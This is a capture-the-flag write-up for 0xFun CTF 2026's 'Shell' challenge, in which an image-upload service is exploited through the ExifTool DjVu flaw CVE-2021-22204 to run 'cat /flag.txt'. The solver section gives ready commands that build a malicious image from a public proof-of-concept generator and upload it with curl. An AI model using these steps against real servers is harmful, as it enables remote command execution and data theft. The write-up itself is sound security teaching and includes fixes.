---
title: "[Warmup] Shell"
description: Writeup for "Shell" from 0xFun CTF 2026.
date: 2026-02-15 01:00:00 +0900
categories: [CTF, 0xFun CTF 2026]
tags: [Warmup]
toc: true
comments: false
---

## TL;DR

A file upload service parses uploaded images with **ExifTool**.
By uploading a crafted file that triggers **CVE-2021-22204** (ExifTool DjVu RCE), we execute `cat /flag.txt` on the server.
The command output comes back mixed into the ExifTool result inside the HTML `<pre>` block.

**Flag:** `0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}`

---

## Overview

The page says "Only image uploads are allowed" and displays the uploaded file's EXIF metadata.
Internally, the server runs `exiftool <uploaded_file>` and renders the output as HTML.

The key insight: **restricting uploads to images doesn't mean parsing them is safe.**
If the parser (ExifTool) has a vulnerability, uploading a file alone can trigger RCE.

---

## Solution

### 1) Recon

After uploading a test file, the response `<pre>` block reveals:

- `ExifTool Version Number : 12.16`
- A crafted file is recognized as `File Type : DJVU`

So the server flow is:
1. Receive uploaded file
2. Run `exiftool <file>`
3. Render output in `<pre>`

### 2) Root Cause

ExifTool 12.16 is vulnerable to **CVE-2021-22204** — a RCE bug in its DjVu file parsing path.
An attacker can embed an arbitrary command inside a crafted DjVu payload, and ExifTool executes it during parsing.

### 3) Exploit

#### (A) Generate the payload

Manually crafting DjVu bytes can get `File Type: DJVU` but may not reliably hit the vulnerable code path.
Using a verified PoC generator is more reliable:

```bash
git clone https://github.com/UNICORDev/exploit-CVE-2021-22204.git
cd exploit-CVE-2021-22204

# Embed the flag-reading command into the payload
python3 exploit-CVE-2021-22204.py -c "cat /flag.txt"
# Output: image.jpg
```

#### (B) Upload and get the flag

Upload `image.jpg` — the server parses it with ExifTool, which triggers the payload and runs `cat /flag.txt`.
The command output is mixed into the ExifTool response inside `<pre>`.

```bash
curl -s -F 'file=@image.jpg;filename=image.jpg' http://chall.0xfun.org:52530/ -o out.html
grep -oE '0xfun\{[^}]+\}' out.html
```

The flag appears at the top of the `<pre>` block, before the normal ExifTool output.

### 4) Why it works

The server trusts the uploaded file and passes it directly to ExifTool.
ExifTool's DjVu parser executes the embedded `system('cat /flag.txt')` payload during parsing.
The command output is mixed into ExifTool's stdout, which the server renders as HTML — so the flag comes back in the response.

> The flag isn't stored in `out.html` — it's the **live output of a command executed on the server**, returned via the vulnerable parsing path.

---

## Solver

```bash
# 1) Get the PoC generator
git clone https://github.com/UNICORDev/exploit-CVE-2021-22204.git
cd exploit-CVE-2021-22204

# 2) Build the malicious image
python3 exploit-CVE-2021-22204.py -c "cat /flag.txt"

# 3) Upload and save the response
curl -s -F 'file=@image.jpg;filename=image.jpg' http://chall.0xfun.org:52530/ -o out.html

# 4) Extract the flag
grep -oE '0xfun\{[^}]+\}' out.html
```

---

## Notes

- For ExifTool-based challenges, what matters is **which parser processes the upload**, not just whether the file extension is an image.
- Manually crafting DjVu bytes can reach `File Type: DJVU`, but a verified PoC generator is needed to reliably trigger the vulnerable code path.
- **Fix:** Run file parsers in a sandbox with minimal permissions, keep ExifTool updated, and always escape parser output before rendering it as HTML.
